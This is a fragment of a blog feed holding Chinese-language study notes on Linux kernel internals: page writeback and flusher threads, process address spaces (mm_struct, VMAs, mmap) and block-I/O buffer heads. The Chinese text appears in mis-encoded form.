id="ä»¥å‰çš„é¡µæ•£åˆ—è¡¨"><a href="#ä»¥å‰çš„é¡µæ•£åˆ—è¡¨" class="headerlink" title="ä»¥å‰çš„é¡µæ•£åˆ—è¡¨"></a>ä»¥å‰çš„é¡µæ•£åˆ—è¡¨</h3><p>ç»´æŠ¤äº†ç³»ç»Ÿä¸­æ‰€æœ‰é¡µçš„å…¨å±€æ•£åˆ—è¡¨</p><h2 id="ç¼“å†²åŒºé«˜é€Ÿç¼“å­˜buffer-cache"><a href="#ç¼“å†²åŒºé«˜é€Ÿç¼“å­˜buffer-cache" class="headerlink" title="ç¼“å†²åŒºé«˜é€Ÿç¼“å­˜buffer cache"></a>ç¼“å†²åŒºé«˜é€Ÿç¼“å­˜buffer cache</h2><p>å‡å°‘ç£ç›˜è®¿é—®ï¼Œä½œä¸ºé¡µé«˜é€Ÿç¼“å­˜çš„ä¸€éƒ¨åˆ†</p><p>ç¼“å†²å’Œé¡µé«˜é€Ÿç¼“å­˜å¹¶éå¤©ç”Ÿç»Ÿä¸€</p><p>2.4å‰ä¸€ä¸ªç£ç›˜å—å¯ä»¥åŒæ—¶åœ¨ä¸¤ä¸ªç¼“å­˜ä¸­</p><h2 id="flusherçº¿ç¨‹"><a href="#flusherçº¿ç¨‹" class="headerlink" title="flusherçº¿ç¨‹"></a>flusherçº¿ç¨‹</h2><p>ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼Œè„é¡µå†™å›ç£ç›˜ï¼š</p><ol><li>ç©ºé—²å†…å­˜ä½äºé˜ˆå€¼</li><li>è„é¡µé©»ç•™æ—¶é—´è¶…è¿‡é˜ˆå€¼</li><li>ç”¨æˆ·è°ƒç”¨syncå’Œfsync</li></ol><p>2.6ä¸­a gang of å†…æ ¸çº¿ç¨‹ï¼Œflusherçº¿ç¨‹å®Œæˆä¸‰ä¸ªå·¥ä½œ</p><p>å‘¨æœŸæ€§è¢«å”¤é†’ï¼Œå®Œæˆå‰ä¸¤ä¸ªå·¥ä½œ</p><p>/proc/sys/vmä¸­è®¾ç½®å›å†™çš„ç›¸å…³å‚æ•°ï¼Œä¹Ÿå¯ä»¥sysctlç³»ç»Ÿè°ƒç”¨è®¾ç½®</p><table><thead><tr><th>å˜é‡</th><th>æè¿°</th></tr></thead><tbody><tr><td>dirty_background_ratio</td><td></td></tr><tr><td>dirty_expire_interval</td><td>è¶…æ—¶å¤šä¹…</td></tr><tr><td>dirty_ratio</td><td></td></tr><tr><td>dirty_writeback_interval</td><td>pdflushè¿è¡Œé¢‘ç‡</td></tr><tr><td>laptop_mode</td><td></td></tr></tbody></table><h3 id="laptop-mode"><a href="#laptop-mode" class="headerlink" title="laptop mode"></a>laptop mode</h3><p>è®©ç¡¬ç›˜æœºæ¢°è¡Œä¸ºæœ€å°åŒ–ï¼Œå…è®¸ç¡¬ç›˜é•¿æ—¶é—´åœæ­¢ï¼Œå»¶é•¿ç”µæ± æ—¶é—´</p><p>æ‰¾å‡†æ—¶æœºï¼Œä¸€æ¬¡å†™ç£ç›˜å†™å¾ˆå¤š</p><p>è¦æ±‚åˆ«çš„é˜ˆå€¼ä¹Ÿå°½å¯èƒ½å¤§</p><p>å¤šæ•°linuxä¼šåœ¨å……ç”µæ—¶è‡ªåŠ¨å…³é—­ï¼Œæ‹”ç”µæºæ—¶è‡ªåŠ¨å¼€å¯</p><h3 id="bdflush-kupdatedå’Œpdflush"><a href="#bdflush-kupdatedå’Œpdflush" class="headerlink" title="bdflush,kupdatedå’Œpdflush"></a>bdflush,kupdatedå’Œpdflush</h3><p>2.6å‰ï¼Œå‰ä¸¤è€…</p><p>åŸºäºç¼“å†²ï¼Œåªæœ‰ä¸€ä¸ªbdflush</p><p>2.6pdflush</p><p>é¢å‘æ‰€æœ‰ç£ç›˜ï¼Œå®¹æ˜“æ‹¥å¡</p><p>2.6.32åflusher</p><p>flusheré’ˆå¯¹æ¯ä¸ªç£ç›˜ç‹¬ç«‹æ‰§è¡Œå›å†™</p><h3 id="é¿å…æ‹¥å¡ï¼šå¤šçº¿ç¨‹"><a href="#é¿å…æ‹¥å¡ï¼šå¤šçº¿ç¨‹" class="headerlink" title="é¿å…æ‹¥å¡ï¼šå¤šçº¿ç¨‹"></a>é¿å…æ‹¥å¡ï¼šå¤šçº¿ç¨‹</h3><p>bdflush</p>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹åœ°å€ç©ºé—´</title>
      <link href="/2023/10/07/%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/10/07/%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›ç¨‹åœ°å€ç©ºé—´"><a href="#è¿›ç¨‹åœ°å€ç©ºé—´" class="headerlink" title="è¿›ç¨‹åœ°å€ç©ºé—´"></a>è¿›ç¨‹åœ°å€ç©ºé—´</h1><h2 id="15-1-åœ°å€ç©ºé—´"><a href="#15-1-åœ°å€ç©ºé—´" class="headerlink" title="15.1 åœ°å€ç©ºé—´"></a>15.1 åœ°å€ç©ºé—´</h2><h2 id="15-2-å†…å­˜æè¿°ç¬¦"><a href="#15-2-å†…å­˜æè¿°ç¬¦" class="headerlink" title="15.2 å†…å­˜æè¿°ç¬¦"></a>15.2 å†…å­˜æè¿°ç¬¦</h2><p>å†…æ ¸ç”¨å†…å­˜æè¿°ç¬¦ï¼Œè¡¨ç¤ºè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæè¿°äº†ä¸è¿›ç¨‹åœ°å€æœ‰å…³çš„æ‰€æœ‰ä¿¡æ¯</p><p>mm_structç»“æ„ä½“ï¼Œå®šä¹‰åœ¨&lt;linux/sched.h&gt;ä¸­</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> mm_struct<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> vm_area_struct     <span class="token operator">*</span>mmap<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*å†…å­˜åŒºåŸŸé“¾è¡¨*/</span>    <span class="token keyword">struct</span> rb_root            mm_rb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*VMAå½¢æˆçš„çº¢é»‘æ ‘*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    pgd_t                    <span class="token operator">*</span>pgd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> list_head        mmlist<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*æ‰€æœ‰mm_structå½¢æˆçš„é“¾è¡¨*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    atomic_t                mm_users<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*ä½¿ç”¨åœ°å€ç©ºé—´çš„ç”¨æˆ·æ•°*/</span>    atomic_t                mm_count<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*ä¸»ä½¿ç”¨è®¡æ•°å™¨*/</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>mm_usersï¼šå¦‚æœä¸¤ä¸ªçº¿ç¨‹å…±äº«åœ°å€ç©ºé—´ï¼Œåˆ™ç­‰äº2, mm_countä¸ºå¢åŠ é‡ï¼Œåˆ™ä¸º1</p><p>â€‹                    9ä¸ªçº¿ç¨‹å…±äº«ï¼Œmm_countä»ä¸º1</p><p>åªæœ‰mm_userså‡ä¸º0ï¼Œmm_countæ‰ä¸º0ï¼Œç»“æ„ä½“æ’¤é”€</p><p>mmapå’Œmm_rbæè¿°çš„å¯¹è±¡ç›¸åŒï¼Œåœ°å€ç©ºé—´ä¸­æ‰€æœ‰çš„å†…å­˜åŒºåŸŸ</p><p>å‰è€…ä»¥é“¾è¡¨å½¢å¼ï¼Œåè€…ä»¥çº¢é»‘æ ‘</p><p>å†—ä½™çš„æ„ä¹‰ï¼šé“¾è¡¨é€‚åˆä¾¿åˆ©ï¼Œmm_rbé€‚åˆæœç´¢</p><p>mm_structï¼šé€šè¿‡ mmliståŸŸè¿æ¥åœ¨åŒå‘é“¾è¡¨ï¼Œé¦–å…ƒç´ æ˜¯init_mmå†…å­˜æè¿°ç¬¦ï¼Œä»£è¡¨initè¿›ç¨‹çš„åœ°å€ç©ºé—´</p><p>æ“ä½œæ—¶ä½¿ç”¨mmlist_lockï¼Œå®šä¹‰åœ¨kernel/fork.c</p><h3 id="15-2-1-åˆ†é…å†…å­˜æè¿°ç¬¦"><a href="#15-2-1-åˆ†é…å†…å­˜æè¿°ç¬¦" class="headerlink" title="15.2.1 åˆ†é…å†…å­˜æè¿°ç¬¦"></a>15.2.1 åˆ†é…å†…å­˜æè¿°ç¬¦</h3><p>è¿›ç¨‹æè¿°ç¬¦task_structä¸­ï¼ŒmmåŸŸå­˜æ”¾è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜æè¿°ç¬¦ï¼Œcurrent-&gt;mm</p><p>fork()å‡½æ•°åˆ©ç”¨copy_mmå¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜æè¿°ç¬¦</p><p>mm_structå®é™…ç”±fork.cä¸­çš„allocate_mm()å®ï¼Œä»mm_cachep slabç¼“å­˜ä¸­åˆ†é…å¾—åˆ°â€˜</p><p>é€šå¸¸ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰å”¯ä¸€çš„mm_structï¼Œå³å”¯ä¸€è¿›ç¨‹åœ°å€ç©ºé—´</p><p>å¦‚æœçˆ¶è¿›ç¨‹å¸Œæœ›å’Œå­è¿›ç¨‹å…±äº«åœ°å€ç©ºé—´ï¼Œ<strong>è°ƒç”¨clone()æ—¶è®¾ç½®CLONE_VMæ ‡å¿—ï¼Œè¿™æ ·çš„è¿›ç¨‹ä¸ºçº¿ç¨‹</strong></p><p>CLONE_VMä»…éœ€è¦åœ¨è°ƒç”¨copy_mm()å‡½æ•°å°†mmåŸŸæŒ‡å‘çˆ¶è¿›ç¨‹çš„mm_struct</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>clone_flags <span class="token operator">&amp;</span> CLONE_VM<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*    *    currentæ˜¯çˆ¶è¿›ç¨‹è€Œtskåœ¨fork()æ‰§è¡ŒæœŸé—´æ˜¯å­è¿›ç¨‹    */</span>    <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current<span class="token operator">-></span>mm<span class="token operator">-></span>mm_users<span class="token punctuation">)</span><span class="token punctuation">;</span>    tsk<span class="token operator">-></span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><h3 id="15-2-2-æ’¤é”€å†…å­˜æè¿°ç¬¦"><a href="#15-2-2-æ’¤é”€å†…å­˜æè¿°ç¬¦" class="headerlink" title="15.2.2  æ’¤é”€å†…å­˜æè¿°ç¬¦"></a>15.2.2  æ’¤é”€å†…å­˜æè¿°ç¬¦</h3><p>è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå†…æ ¸è°ƒç”¨å®šä¹‰åœ¨kernel/exit.cä¸­çš„exit_mm()å‡½æ•°</p><p>æ›´æ–°ç»Ÿè®¡é‡ï¼Œè°ƒç”¨mmput()å‡å°‘mm_usersè®¡æ•°</p><p>è°ƒç”¨mmdrop()å‡å°‘mm_countè®¡æ•°</p><p>è°ƒç”¨free_mm()å®ï¼Œå½’è¿˜åˆ°mm_cachep slabç¼“å­˜</p><h3 id="15-2-3-mm-structåŸŸå†…æ ¸çº¿ç¨‹"><a href="#15-2-3-mm-structåŸŸå†…æ ¸çº¿ç¨‹" class="headerlink" title="15.2.3 mm_structåŸŸå†…æ ¸çº¿ç¨‹"></a>15.2.3 mm_structåŸŸå†…æ ¸çº¿ç¨‹</h3><p>å†…æ ¸çº¿ç¨‹æ²¡ç”¨è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œæ²¡æœ‰å†…å­˜æè¿°ç¬¦ï¼Œæ‰€ä»¥è¿›ç¨‹æè¿°ç¬¦ä¸­mmä¸ºç©º</p><p>å†…æ ¸çº¿ç¨‹ä¸éœ€è¦è®¿é—®ä»»ä½•ç”¨æˆ·ç©ºé—´çš„å†…å­˜</p><p>ä¸éœ€è¦è‡ªå·±çš„å†…å­˜æè¿°ç¬¦å’Œé¡µè¡¨</p><p>ä¸ºäº†é¿å…åˆ‡æ¢åœ°å€ç©ºé—´ï¼Œå†…æ ¸çº¿ç¨‹ç›´æ¥ä½¿ç”¨å‰ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜æè¿°ç¬¦</p><p>å½“è¿›ç¨‹è°ƒåº¦æ—¶ï¼ŒmmåŸŸæŒ‡å‘çš„åœ°å€ç©ºé—´è¢«è£…è½½åˆ°å†…å­˜ï¼Œè¿›ç¨‹æè¿°ç¬¦ä¸­çš„active_mmåŸŸè¢«æ›´æ–°</p><p>å†…æ ¸mmåŸŸä¸ºç©ºï¼Œå½“å†…æ ¸çº¿ç¨‹è¢«è°ƒåº¦æ—¶ï¼Œä¼šä¿ç•™å‰ä¸€ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå†…æ ¸æ›´æ–°è¿›ç¨‹æè¿°ç¬¦ä¸­çš„active_mmä¸ºå‰ä¸€ä¸ªè¿›ç¨‹çš„mm</p><p>éœ€è¦æ—¶ï¼Œå†…æ ¸çº¿ç¨‹å¯ä½¿ç”¨å‰ä¸€ä¸ªè¿›ç¨‹çš„é¡µè¡¨ï¼Œä»…ä½¿ç”¨åœ°å€ç©ºé—´ä¸­å’Œå†…æ ¸ç›¸å…³çš„ä¿¡æ¯ï¼ˆå­˜åœ¨å¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´ä¿¡æ¯çš„å¯èƒ½ï¼‰</p><h2 id="15-3-è™šæ‹Ÿå†…å­˜åŒºåŸŸ"><a href="#15-3-è™šæ‹Ÿå†…å­˜åŒºåŸŸ" class="headerlink" title="15.3 è™šæ‹Ÿå†…å­˜åŒºåŸŸ"></a>15.3 è™šæ‹Ÿå†…å­˜åŒºåŸŸ</h2><p>å†…å­˜åŒºåŸŸç”±vm_area_structç»“æ„ä½“æè¿°ï¼Œå®šä¹‰åœ¨&lt;linux/mm_types.h&gt;</p><p>è™šæ‹Ÿå†…å­˜åŒºåŸŸ virtual memeoryAreas, VMAs</p><p>vm_area_structæè¿°äº†è¿ç»­åŒºé—´çš„ç‹¬ç«‹å†…å­˜èŒƒå›´</p><p>æ¯ä¸ªVMAå¯ä»£è¡¨ä¸åŒçš„å†…å­˜åŒºåŸŸï¼šå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œè¿›ç¨‹ç”¨æˆ·ç©ºé—´æ ˆ</p><pre><code>struct vm_area_struct&#123;    struct mm_struct        *vm_mm;    unsigned long             vm_start;    unsigned long             vm_end;    struct vm_area_struct    *vm_next;    pgprog_t                vm_page_prot;    unsigned long            vm_flags;    ...    struct vm_operations_struct    &amp;vm_ops;    ...&#125;</code></pre><p>æ¯ä¸ªVMAå¯¹å…¶ç›¸å…³çš„mm_structéƒ½æ˜¯å”¯ä¸€çš„</p><h3 id="15-3-1-VMAæ ‡å¿—"><a href="#15-3-1-VMAæ ‡å¿—" class="headerlink" title="15.3.1 VMAæ ‡å¿—"></a>15.3.1 VMAæ ‡å¿—</h3><p>&lt;linux/mm.h&gt;</p><p>åŒ…å«åœ¨vm_flagsåŸŸå†…</p><p>åæ˜ äº†å†…æ ¸å¤„ç†é¡µé¢éœ€è¦éµå®ˆçš„è¡Œä¸ºå‡†åˆ™ï¼Œè€Œä¸æ˜¯ç¡¬ä»¶è¦æ±‚</p><table><thead><tr><th>æ ‡å¿—</th><th>å¯¹VMAä»¥åŠé¡µé¢çš„å½±å“</th></tr></thead><tbody><tr><td>VM_READ,VM_WRITE,VM_EXEC</td><td></td></tr><tr><td>VM_SHARED</td><td>é¡µé¢å¯å…±äº«</td></tr><tr><td>VM_MAYREAD,â€¦</td><td>READï¼ŒWRITEï¼ŒEXECå¯è®¾ç½®</td></tr><tr><td>VM_GROWSDOWN</td><td>å¯å‘ä¸‹å¢é•¿</td></tr><tr><td>VM_SHM</td><td>å¯åšå…±äº«å†…å­˜</td></tr><tr><td>VM_IO</td><td>é¡µé¢æ˜ å°„è®¾å¤‡IOç©ºé—´</td></tr><tr><td>VM_SEQ_READ</td><td>å¯èƒ½è¢«è¿ç»­è®¿é—®</td></tr><tr><td>VM_DONTCOPY</td><td>ä¸èƒ½åœ¨forkæ—¶è¢«æ‹·è´</td></tr><tr><td>VM_RESERVED</td><td>åŒºåŸŸä¸èƒ½è¢«æ¢å‡º</td></tr></tbody></table><p>é¡µé¢çš„æƒé™è¿˜è¦å’Œè®¿é—®æƒé™é…åˆ</p><p>VM_IOå¸¸åœ¨é©±åŠ¨è®¾å¤‡æ‰§è¡Œçš„mmap()å‡½æ•°ä¸­è®¾ç½®ï¼ŒåŒæ—¶è¡¨ç¤ºå†…å­˜åŒºåŸŸä¸èƒ½è¢«åŒ…å«åœ¨ä»»ä½•è¿›ç¨‹çš„core dumpä¸­</p><p>VM_SEQ_READ,VM_RAND_READå†³å®šå†…æ ¸æ˜¯å¦æœ‰å¿…è¦é¢„è¯»å–æ–‡ä»¶</p><h3 id="15-3-2-VMAæ“ä½œ"><a href="#15-3-2-VMAæ“ä½œ" class="headerlink" title="15.3.2 VMAæ“ä½œ"></a>15.3.2 VMAæ“ä½œ</h3><pre><code>struct vm_operations_struct&#123;    //å†…å­˜åŒºåŸŸè¢«åŠ å…¥åœ°å€ç©ºé—´    void(*open)(struct vm_area_struct *);    //å†…å­˜åŒºåŸŸè¢«åˆ é™¤    void(*close)(struct vm_area_struct *);    //æ²¡æœ‰å‡ºç°åœ¨ç‰©ç†å†…å­˜çš„é¡µé¢    int(*fault)(struct vm_area_struct *, struct vm_fault *);    //åªè¯»è¢«å†™    int(*page_mkwrite)(struct vm_area_struct *, struct vm_fault *);    //get_user_pagesï¼ˆï¼‰è°ƒç”¨å¤±è´¥ï¼Œaccess_process_vm()è°ƒç”¨    int(*access)(struct vm_area_struct *,unsigned long, void*, int, int);&#125;</code></pre><h3 id="15-3-3-å†…å­˜åŒºåŸŸçš„æ ‘å½¢å’Œé“¾è¡¨ç»“æ„"><a href="#15-3-3-å†…å­˜åŒºåŸŸçš„æ ‘å½¢å’Œé“¾è¡¨ç»“æ„" class="headerlink" title="15.3.3 å†…å­˜åŒºåŸŸçš„æ ‘å½¢å’Œé“¾è¡¨ç»“æ„"></a>15.3.3 å†…å­˜åŒºåŸŸçš„æ ‘å½¢å’Œé“¾è¡¨ç»“æ„</h3><h3 id="15-3-4-å®é™…ä½¿ç”¨ä¸­çš„å†…å­˜åŒºåŸŸ"><a href="#15-3-4-å®é™…ä½¿ç”¨ä¸­çš„å†…å­˜åŒºåŸŸ" class="headerlink" title="15.3.4 å®é™…ä½¿ç”¨ä¸­çš„å†…å­˜åŒºåŸŸ"></a>15.3.4 å®é™…ä½¿ç”¨ä¸­çš„å†…å­˜åŒºåŸŸ</h3><p>cat /proc/1426/mapså¯æŸ¥çœ‹å†…å­˜åŒºåŸŸ</p><p>ä¸å¯å†™çš„å†…å­˜åŒºåŸŸå¯ä»¥åªä¿ç•™ä¸€ä»½æ˜ å°„ï¼Œæ‰€æœ‰è¿›ç¨‹çš„libcåº“åœ¨ç‰©ç†å†…å­˜ä¸­å®é™…åªéœ€è¦ä¸€ä»½</p><p>è¿™æ ·çš„æ–¹å¼èƒ½èŠ‚çº¦å¤§é‡çš„å†…å­˜</p><p>æ²¡æœ‰æ˜ å°„æ–‡ä»¶çš„å†…å­˜åŒºåŸŸè®¾å¤‡æ ‡å¿—ä¸º00ï¼š00ï¼Œç´¢å¼•èŠ‚ç‚¹æ ‡å¿—ä¹Ÿä¸º0ï¼Œè¿™å°±æ˜¯é›¶é¡µâ€”â€”é›¶é¡µæ˜ å°„çš„å†…å®¹å…¨0</p><h2 id="15-4-æ“ä½œå†…å­˜åŒºåŸŸ"><a href="#15-4-æ“ä½œå†…å­˜åŒºåŸŸ" class="headerlink" title="15.4 æ“ä½œå†…å­˜åŒºåŸŸ"></a>15.4 æ“ä½œå†…å­˜åŒºåŸŸ</h2><h3 id="15-4-1-find-vma"><a href="#15-4-1-find-vma" class="headerlink" title="15.4.1 find_vma()"></a>15.4.1 find_vma()</h3><p>å†…å­˜åœ°å€å±äºå“ªä¸ªåŒºåŸŸ</p><p>å…ˆæ£€æŸ¥mmap_cacheï¼Œå†æœç´¢çº¢é»‘æ ‘</p><h3 id="15-4-2-find-vma-prev"><a href="#15-4-2-find-vma-prev" class="headerlink" title="15.4.2 find_vma_prev()"></a>15.4.2 find_vma_prev()</h3><p>è¿”å›ç¬¬ä¸€ä¸ªå°äºaddrçš„VMA</p><h3 id="15-4-3-find-vma-intersection"><a href="#15-4-3-find-vma-intersection" class="headerlink" title="15.4.3 find_vma_intersection()"></a>15.4.3 find_vma_intersection()</h3><p>è¿”å›ç¬¬ä¸€ä¸ªå’ŒæŒ‡å®šåŒºé—´ç›¸äº¤çš„VMA</p><h2 id="15-5-mmap-å’Œdo-mmap-ï¼šåˆ›å»ºåœ°å€åŒºé—´"><a href="#15-5-mmap-å’Œdo-mmap-ï¼šåˆ›å»ºåœ°å€åŒºé—´" class="headerlink" title="15.5 mmap()å’Œdo_mmap()ï¼šåˆ›å»ºåœ°å€åŒºé—´"></a>15.5 mmap()å’Œdo_mmap()ï¼šåˆ›å»ºåœ°å€åŒºé—´</h2><p>do_mmap:åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿æ€§åœ°å€åŒºé—´</p><pre><code>unsigned long dommap(struct file*file, unsigned long addr, unsigned long len, unsigned long prot, unsigned long flag, unsigned long offset)</code></pre><p>fileå–NULLï¼Œoffset=0ï¼Œè¿™æ¬¡æ˜ å°„æ²¡æœ‰æ–‡ä»¶ç›¸å…³ï¼šåŒ¿åæ˜ å°„ï¼Œå¦åˆ™æ–‡ä»¶æ˜ å°„</p><p>addr:å¯é€‰</p><p>ç”¨æˆ·ç©ºé—´é€šè¿‡mmap()ç³»ç»Ÿè°ƒç”¨è·å–do_mmap()åŠŸèƒ½</p><h2 id="15-6-mummap-å’Œdo-mummap"><a href="#15-6-mummap-å’Œdo-mummap" class="headerlink" title="15.6 mummap()å’Œdo_mummap()"></a>15.6 mummap()å’Œdo_mummap()</h2><p>åˆ é™¤åœ°å€ç©ºé—´</p><h2 id="15-7-é¡µè¡¨"><a href="#15-7-é¡µè¡¨" class="headerlink" title="15.7 é¡µè¡¨"></a>15.7 é¡µè¡¨</h2><p>å†…æ ¸æ­£ç¡®è®¾ç½®é¡µè¡¨çš„å‰æä¸‹ï¼Œç¡¬ä»¶æ‰èƒ½æ“ä½œä»–ä»¬</p><p>æ¯ä¸ªè¿›ç¨‹å­—èŠ‚çš„é¡µè¡¨ï¼Œå†…å­˜æè¿°ç¬¦çš„pgdåŸŸæŒ‡å‘é¡µå…¨å±€ç›®å½•ï¼Œç„¶åä¸‰çº§é¡µè¡¨</p><p>é¡µè¡¨å¯¹åº”çš„ç»“æ„ä½“ä¾èµ–äºå…·ä½“çš„ä½“ç³»ç»“æ„ï¼Œasm/page.h</p><p>é¡µè¡¨çš„ç®¡ç†æ—¶å†…æ ¸çš„å…³é”®éƒ¨åˆ†ï¼Œä¸æ–­æ”¹è¿›ï¼Œ2.6ï¼š</p><ol><li>é«˜ç«¯å†…å­˜åˆ†é…é¡µè¡¨</li><li>å†™æ—¶æ‹·è´å…±äº«é¡µè¡¨ï¼Œï¼ˆä¸æ”¹å°±ä¸åˆ†é…æ–°çš„ï¼‰</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20231005</title>
      <link href="/2023/10/05/2023-10-05/"/>
      <url>/2023/10/05/2023-10-05/</url>
      
        <content type="html"><![CDATA[<h1 id="å—I-O"><a href="#å—I-O" class="headerlink" title="å—I/O"></a>å—I/O</h1><p>å—è®¾å¤‡ï¼šéšæœºè®¿é—®å›ºå®šå¤§å°æ•°æ®ç‰‡ï¼ˆchunksï¼‰çš„ç¡¬ä»¶è®¾å¤‡</p><p>å¸¸è§ï¼šç¡¬ç›˜ï¼Œè½¯ç›˜é©±åŠ¨å™¨ï¼Œé—ªå­˜</p><p>ä»¥å®‰è£…FSçš„æ–¹å¼ä½¿ç”¨</p><p>å­—ç¬¦è®¾å¤‡ï¼šæŒ‰ç…§å­—ç¬¦æµçš„é¡ºåºæœ‰åºè®¿é—®</p><p>å¸¸è§ï¼šä¸²å£ï¼Œé”®ç›˜</p><p>å†…æ ¸ç®¡ç†å—è®¾å¤‡æ¯”ç®¡ç†å­—ç¬¦è®¾å¤‡ç»†è‡´çš„å¤šï¼š</p><ol><li>å› ä¸ºå·¥ç¨‹é‡å¤§</li><li>å—è®¾å¤‡å¯¹æ‰§è¡Œæ€§èƒ½è¦æ±‚å¾ˆé«˜</li></ol><p>æ”¹å†™å—IOå±‚æ˜¯2.5å¼€å‘ç‰ˆå†…æ ¸çš„ä¸»è¦ç›®æ ‡</p><h2 id="14-1-å‰–æä¸€ä¸ªå—è®¾å¤‡"><a href="#14-1-å‰–æä¸€ä¸ªå—è®¾å¤‡" class="headerlink" title="14.1 å‰–æä¸€ä¸ªå—è®¾å¤‡"></a>14.1 å‰–æä¸€ä¸ªå—è®¾å¤‡</h2><p>å—è®¾å¤‡çš„åŸºæœ¬å•å…ƒï¼šæ‰‡åŒº</p><p>é€»è¾‘æœ€å°å¯å¯»å€å•å…ƒï¼šå—</p><p>å†…æ ¸è¦æ±‚ï¼Œå—çš„å¤§å°æ˜¯2çš„æ•´æ•°å€ï¼Œä¸”ä¸èƒ½è¶…è¿‡ä¸€ä¸ªé¡µ</p><p>å¸¸ç”¨çš„å—å¤§å°ï¼š512ï¼Œ1Kï¼Œ4K</p><p>ç°‡ï¼ŒæŸ±é¢å’Œç£å¤´ï¼šé’ˆå¯¹ç‰¹å®šçš„å—è®¾å¤‡</p><h2 id="14-2-ç¼“å†²åŒºå’Œç¼“å†²åŒºå¤´"><a href="#14-2-ç¼“å†²åŒºå’Œç¼“å†²åŒºå¤´" class="headerlink" title="14.2 ç¼“å†²åŒºå’Œç¼“å†²åŒºå¤´"></a>14.2 ç¼“å†²åŒºå’Œç¼“å†²åŒºå¤´</h2><p>æ¯ä¸ªç¼“å†²åŒºå’Œä¸€ä¸ªå—å¯¹åº”ï¼Œç›¸å½“äºç£ç›˜å—åœ¨å†…å­˜ä¸­çš„è¡¨ç¤º</p><p>æ¯ä¸ªç¼“å†²åŒºæœ‰ä¸€ä¸ªå¯¹åº”çš„æè¿°ç¬¦ï¼Œç”¨buffer_headè¡¨ç¤ºï¼Œç§°ä¸ºç¼“å†²åŒºå¤´</p><p>åœ¨&lt;linux/buffer_head.h&gt;ä¸­å®šä¹‰</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> buffer_head<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> b_state<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">struct</span> page <span class="token operator">*</span>b_page<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/*å­˜å‚¨ç¼“å†²åŒºçš„é¡µé¢*/</span>       sector_t b_blocknr<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/*èµ·å§‹å—å·*/</span>    size_t b_size<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">/*æ˜ åƒçš„å¤§å°*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">struct</span> block_device <span class="token operator">*</span>b_dev<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*ç›¸å…³è”çš„å¿«è®¾å¤‡*/</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    atomic_t b_count<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>b_stateè¡¨ç¤ºç¼“å†²åŒºçŠ¶æ€ï¼Œå¯ä»¥æ˜¯å¤šç§æ ‡å¿—çš„ç»„åˆ</p><p>åˆæ³•çš„æ ‡å¿—å­˜å‚¨åœ¨bh_state_bitsæšä¸¾ä¸­ï¼Œè¯¥æšä¸¾åœ¨&lt;linux/buffer_head.h&gt;ä¸­å®šä¹‰</p><table><thead><tr><th>çŠ¶æ€æ 